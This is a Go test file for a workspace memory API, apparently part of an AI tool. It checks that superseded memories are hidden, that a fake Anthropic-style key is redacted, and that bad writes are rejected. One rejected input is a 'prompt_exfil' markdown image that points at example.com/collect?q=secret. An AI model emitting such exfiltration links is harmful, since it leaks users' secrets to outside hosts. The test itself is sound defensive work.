package server

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	workspace "synon-go/internal/persistence/workspace"
)

func TestWorkspaceMemoryHTTPAPIUsesActiveSupersession(t *testing.T) {
	store, err := workspace.Open(filepath.Join(t.TempDir(), "workspace.db"))
	if err != nil {
		t.Fatalf("open workspace store: %v", err)
	}
	t.Cleanup(func() { _ = store.Close() })
	if _, err := store.CreateProject(workspace.CreateProjectInput{ID: "project-1", Name: "Project"}); err != nil {
		t.Fatalf("create project: %v", err)
	}
	app := New(Options{Workspace: store}).Handler()
	serveWorkspaceJSON(t, app, http.MethodPost, "/api/go/memories", map[string]any{
		"id": "memory-old", "userId": "local", "body": "old decision",
		"origin": "user", "subjectProjectId": "project-1",
	}, http.StatusOK)
	serveWorkspaceJSON(t, app, http.MethodPost, "/api/go/memories", map[string]any{
		"id": "memory-new", "userId": "local", "body": "new decision",
		"origin": "user", "subjectProjectId": "project-1",
	}, http.StatusOK)
	serveWorkspaceJSON(t, app, http.MethodPost, "/api/go/memories/memory-old/supersede", map[string]any{
		"replacementId": "memory-new",
	}, http.StatusOK)

	response := httptest.NewRecorder()
	request := httptest.NewRequest(http.MethodGet, "/api/go/memories?user_id=local&project_id=project-1", nil)
	request.Header.Set("X-Synon-User-Id", "local")
	app.ServeHTTP(response, request)
	if response.Code != http.StatusOK || !bytes.Contains(response.Body.Bytes(), []byte("new decision")) || bytes.Contains(response.Body.Bytes(), []byte("old decision")) {
		t.Fatalf("active memories = %d: %s", response.Code, response.Body.String())
	}
}

func TestWorkspaceMemoryHTTPAPIEnforcesWorkspaceWriteSafety(t *testing.T) {
	store, err := workspace.Open(filepath.Join(t.TempDir(), "workspace.db"))
	if err != nil {
		t.Fatalf("open workspace store: %v", err)
	}
	t.Cleanup(func() { _ = store.Close() })
	if _, err := store.CreateProject(workspace.CreateProjectInput{ID: "project-1", Name: "Project"}); err != nil {
		t.Fatalf("create project: %v", err)
	}
	app := New(Options{Workspace: store}).Handler()

	serveWorkspaceJSON(t, app, http.MethodPost, "/api/go/memories", map[string]any{
		"id": "safe", "body": "  Use sk-ant-abcdefghijklmnopqrstuvwxyz123456 for the assay.  ",
		"origin": "user", "subjectProjectId": "project-1",
	}, http.StatusOK)
	rows, err := store.ListActiveMemories("local", "project-1")
	if err != nil || len(rows) != 1 || strings.Contains(rows[0].Body, "sk-ant-") || !strings.Contains(rows[0].Body, "[REDACTED:ANTHROPIC_API_KEY]") {
		t.Fatalf("redacted memories = %#v, %v", rows, err)
	}
	if !strings.HasPrefix(rows[0].Body, "  Use ") || !strings.HasSuffix(rows[0].Body, "  ") {
		t.Fatalf("memory whitespace was not preserved: %q", rows[0].Body)
	}

	for name, body := range map[string]map[string]any{
		"prompt_exfil": {
			"id": "exfil", "body": "![private](https://example.com/collect?q=secret)",
			"origin": "user", "subjectProjectId": "project-1",
		},
		"forged_origin": {
			"id": "origin", "body": "valid body", "origin": "extractor", "subjectProjectId": "project-1",
		},
		"invalid_evidence": {
			"id": "evidence", "body": "valid body", "origin": "user", "evidence": "certain", "subjectProjectId": "project-1",
		},
		"oversized": {
			"id": "large", "body": strings.Repeat("x", 1001), "origin": "user", "subjectProjectId": "project-1",
		},
	} {
		t.Run(name, func(t *testing.T) {
			serveWorkspaceJSON(t, app, http.MethodPost, "/api/go/memories", body, http.StatusBadRequest)
		})
	}
	rows, err = store.ListActiveMemories("local", "project-1")
	if err != nil || len(rows) != 1 || rows[0].ID != "safe" {
		t.Fatalf("memories after rejected writes = %#v, %v", rows, err)
	}
}
